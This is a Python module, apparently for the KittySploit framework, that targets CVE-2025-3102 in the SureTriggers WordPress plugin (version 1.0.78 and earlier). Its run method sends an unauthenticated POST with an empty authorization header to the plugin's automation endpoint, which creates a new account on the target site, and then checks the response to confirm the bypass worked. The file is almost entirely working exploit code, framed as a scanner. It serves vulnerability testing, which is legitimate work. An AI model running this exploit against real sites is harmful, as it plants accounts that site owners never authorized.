#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SureTriggers <= 1.0.78 - Authentication Bypass"""

import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": 'SureTriggers <= 1.0.78 - Authentication Bypass',
        "description": 'Unauthenticated admin user creation via sure-triggers automation action when secret_key empty.',
        "author": ["KittySploit Team"],
        "severity": 'high',
        "cve": 'CVE-2025-3102',
        "tags": ['web', 'scanner', 'cve', 'cve2025', 'vuln', 'wordpress', 'wp-plugin', 'suretriggers', 'auth-bypass', 'vkev', 'intrusive'],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.2,
            "value": 1.0,
        },
        "references": ['https://www.wordfence.com/threat-intel/vulnerabilities/id/ec017311-f150-4a14-a4b4-b5634f574e2b?source=cve', 'https://github.com/Nxploited/CVE-2025-3102', 'https://nvd.nist.gov/vuln/detail/CVE-2025-3102'],
    }

    def run(self):
        # Non-destructive probe: use unlikely username; still intrusive if vulnerable.
        user = "ks_" + secrets.token_hex(3)
        password = secrets.token_hex(6)
        email = f"{user}@example.invalid"
        data = (
            '{"integration":"WordPress","type_event":"create_user_if_not_exists",'
            f'"selected_options":{{"user_email":"{email}","user_name":"{user}","password":"{password}"}},'
            '"fields":[],"context":{}}'
        )
        r = self.http_request(
            method="POST",
            path="/wp-json/sure-triggers/v1/automation/action",
            headers={"Content-Type": "application/json", "st_authorization": ""},
            data=data,
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        ctype = (r.headers.get("Content-Type") or r.headers.get("content-type") or "").lower()
        if "application/json" not in ctype:
            return False
        if '"success":true' not in body.replace(" ", "") and '"success": true' not in body:
            return False
        if "user_registered" not in body:
            return False
        self.set_info(
            severity="high",
            cve="CVE-2025-3102",            reason="SureTriggers created user without configured secret_key",
            path="/wp-json/sure-triggers/v1/automation/action",
            proof_user=user,
            confidence="high",
        )
        return True
